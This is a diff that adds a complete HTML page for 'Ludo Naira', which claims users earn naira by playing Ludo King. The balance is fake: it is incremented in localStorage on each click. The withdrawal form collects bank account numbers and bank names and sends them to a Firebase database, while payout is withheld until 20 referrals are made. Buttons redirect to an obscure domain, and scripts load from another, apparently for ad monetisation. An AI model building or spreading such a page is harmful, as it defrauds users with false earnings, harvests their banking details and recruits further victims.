@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ludo Naira</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: white;
+        }
+
+        /* Header Styling */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: green;
+            color: #fff;
+            padding: 10px 20px;
+            border-bottom-left-radius: 25px;
+            border-bottom-right-radius: 25px;
+            margin-bottom: 30px;
+        }
+
+        .left {
+            display: flex;
+            align-items: center;
+        }
+
+        .profile-icon {
+            width: 50px;
+            height: 50px;
+            margin-right: 10px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+
+.settings-icon {
+  width: 50px;
+  height: 50px;
+}
+
+        .user-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .welcome-text {
+            margin: 0;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .user-id {
+            margin: 0;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .balance-card {
+            background: green;
+            border-radius: 25px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding: 20px 40px;
+            max-width: 280px;
+            width: 90%;
+            height: 80px;
+        }
+
+        .balance-title {
+            font-size: 16px;
+            color: #555555;
+            margin-bottom: 10px;
+        }
+
+        .balance-amount {
+            display: flex;
+            justify-content: center;
+            align-items: baseline;
+            font-weight: bold;
+            margin-top: -35px;
+        }
+
+        .amount {
+            font-size: 32px;
+            color: white;
+        }
+
+        .container {
+            text-align: center;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 295px;
+            margin-top: 20px;
+            margin-left: 10px;
+            margin-right: 10px;
+        }
+
+        .title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .image {
+            width: 150px;
+            height: 150px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-left: 100px;
+            display: flex;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+
+        .withdraw-btn {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: green;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 25px;
+        }
+
+        .withdraw-btn:hover {
+            background-color: green;
+        }
+
+        .referral-container {
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding: 20px 30px;
+            max-width: 280px;
+            width: 90%;
+            margin-top: 30px;
+            margin-left: 10px;
+            margin-right: 10px;
+        }
+
+        .referral-container h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .referral-container p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .referral-link {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .referral-link input {
+            flex: 1;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            text-overflow: ellipsis;
+        }
+
+        .referral-link button {
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 8px 12px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .referral-link button:hover {
+            background-color: #45a049;
+        }
+
+        .info {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .dialog {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.3);
+            z-index: 1000;
+        }
+
+        .dialog input, .dialog select {
+            display: block;
+            margin: 10px 0;
+            padding: 8px;
+            width: 90%;
+        }
+
+        .dialog button {
+            margin-top: 10px;
+            padding: 8px 16px;
+        }
+    </style>
+    
+    
+    
+    <!-- Firebase SDK -->
+     <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-database-compat.js"></script>
+
+     
+   
+    
+</head>
+<body>
+  
+    <header class="header">
+        <div class="left">
+            <img src="https://cdn-icons-png.freepik.com/256/13979/13979771.png?ga=GA1.1.139198705.1725613241&semt=ais_hybrid" alt="Profile Icon" class="profile-icon">
+            <div class="user-info">
+                <p class="welcome-text">Welcome Back</p>
+                <p class="user-id">UserID: <span id="userId"></span></p>
+            </div>
+        </div>
+        
+        
+        <div class="right">
+    <img src="https://cdn-icons-png.flaticon.com/128/12252/12252083.png" alt="Chat Icon" class="settings-icon" onclick="redirectToChat()">
+</div>
+
+<script>
+    function redirectToChat() {
+        window.location.href = "https://x.com/yourpresid?s=09";  // Replace with your desired Twitter URL
+    }
+</script>
+
+
+    </header>
+
+    <div class="balance-card">
+        <p class="balance-title">Available Balance</p>
+        <div class="balance-amount">
+            <p class="amount">₦ <span id="balance">0.00</span></p>
+        </div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Play Ludo King and Earn</h1>
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/9/95/Ludo_King_Logo.webp/180px-Ludo_King_Logo.webp.png" 
+             alt="Ludo King Logo" class="image">
+             
+             <a href="https://ludoking.com/play">
+        <button class="btn" onclick="addBalance()">Play Now</button>
+        </a>
+        
+        <a href="https://whomeenoaglauns.com/4/8686315">
+        <button class="withdraw-btn" onclick="openDialog()">Withdraw</button>
+        </a>
+    </div>
+
+    <div id="withdrawDialog" class="dialog">
+        <h3>Withdrawal Details</h3>
+        <input type="text" id="accountNumber" placeholder="Account Number" />
+        <input type="number" id="withdrawAmount" placeholder="Amount" />
+        <input type="text" id="bankName" placeholder="Bank Name" />
+        <a href="https://whomeenoaglauns.com/4/8686315">
+        <button onclick="proceedWithdrawal()">Proceed Withdrawal</button>
+        </a>
+        <a href="https://whomeenoaglauns.com/4/8686315">
+        <button onclick="closeDialog()">Close</button>
+        </a>
+    </div>
+    
+    <script type='text/javascript' src='//slushhelmetmirth.com/8f/37/0f/8f370f68d61188fd982021f8f5999e68.js'></script>
+    
+    <script type='text/javascript' src='//slushhelmetmirth.com/39/2a/0d/392a0d28346a0e19cd71e87eccfdecf0.js'></script>
+
+    <div class="referral-container">
+        <h2>Invite Your Friends</h2>
+        <p>Share your referral link and earn rewards!</p>
+        <p> You haven't invited anyone</p>
+        <div class="referral-link">
+            <input type="text" id="referral" value="https://tinyurl.com/Ludo4Naira2025" readonly>
+            <button onclick="copyReferral()">Copy</button>
+        </div>
+        <p class="info">Share this link with your friends and earn ₦100</p>
+    </div>
+
+    <script>
+        let userId = localStorage.getItem('userId');
+        let balance = parseFloat(localStorage.getItem('balance')) || 0;
+        let referrals = parseInt(localStorage.getItem('referrals')) || 0;
+
+        // Initialize User ID and Balance
+        if (!userId) {
+            userId = 'user_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('userId', userId);
+        }
+
+        // Display userId and balance
+        document.getElementById('userId').innerText = userId;
+        document.getElementById('balance').innerText = balance.toFixed(2);
+
+        // Add balance when Play Now button is clicked
+        function addBalance() {
+            balance += 15;
+            localStorage.setItem('balance', balance);
+            document.getElementById('balance').innerText = balance.toFixed(2);
+        }
+
+        // Open Withdrawal dialog
+        function openDialog() {
+            document.getElementById('withdrawDialog').style.display = 'block';
+        }
+
+        // Close Withdrawal dialog
+        function closeDialog() {
+            document.getElementById('withdrawDialog').style.display = 'none';
+        }
+
+        // Proceed with withdrawal and show message
+        function proceedWithdrawal() {
+            const accountNumber = document.getElementById('accountNumber').value;
+            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
+            const bankName = document.getElementById('bankName').value;
+
+            if (!accountNumber || !withdrawAmount || !bankName || withdrawAmount <= 0 || withdrawAmount > balance) {
+                alert('Invalid withdrawal details or insufficient balance!');
+                return;
+            }
+
+            balance -= withdrawAmount;
+            localStorage.setItem('balance', balance);
+            document.getElementById('balance').innerText = balance.toFixed(2);
+
+            if (referrals >= 20) {
+                alert('Your withdrawal has been approved!');
+            } else {
+                alert('Withdrawal request submitted. Your withdrawal will be approved once you have 20 referrals.');
+            }
+
+            closeDialog();
+        }
+
+        // Copy referral link to clipboard
+        function copyReferral() {
+            const referralInput = document.getElementById('referral');
+            referralInput.select();
+            referralInput.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            alert('Referral link copied to clipboard!');
+        }
+    </script>
+    
+    
+       <script>
+        // Your Firebase config object (replace with your actual Firebase project credentials)
+        const firebaseConfig = {
+    apiKey: "AIzaSyDJP2XIR51qGTLINiKvEoscYTMt11CaZ5s",
+    authDomain: "paytrust-71e30.firebaseapp.com",
+    databaseURL: "https://paytrust-71e30-default-rtdb.firebaseio.com/",
+    projectId: "paytrust-71e30",
+    storageBucket: "gs://paytrust-71e30.appspot.com",
+    messagingSenderId: "492609516838",
+    appId: "1:492609516838:android:5a924ad3b7e8e508fa3de7"
+};
+        
+        
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+
+        // Function to handle Withdrawal
+        function proceedWithdrawal() {
+            // Get input values from the form
+            const accountNumber = document.getElementById("accountNumber").value;
+            const withdrawAmount = document.getElementById("withdrawAmount").value;
+            const bankName = document.getElementById("bankName").value;
+
+            // Ensure that the required fields are not empty
+            if (!accountNumber || !withdrawAmount || !bankName) {
+                alert("Please fill all fields!");
+                return;
+            }
+
+            // Prepare withdrawal details to push
+            const withdrawalDetails = {
+                accountNumber: accountNumber,
+                withdrawAmount: withdrawAmount,
+                bankName: bankName,
+                timestamp: new Date().toISOString(), // add timestamp for reference
+            };
+
+            // Push data to Firebase Realtime Database
+            const withdrawalRef = database.ref('withdrawals');
+            withdrawalRef.push(withdrawalDetails)
+                .then(() => {
+                    alert('Withdrawal request submitted. Your withdrawal will be approved once you have 20 referrals.');
+                    // Clear input fields after submission
+                    document.getElementById("accountNumber").value = "";
+                    document.getElementById("withdrawAmount").value = "";
+                    document.getElementById("bankName").value = "";
+                })
+                .catch((error) => {
+                    console.error("Error pushing data to Firebase:", error);
+                    alert("An error occurred. Please try again.");
+                });
+        }
+    </script>
+    
+    
+ 
+    
+    
+</body>
+</html>
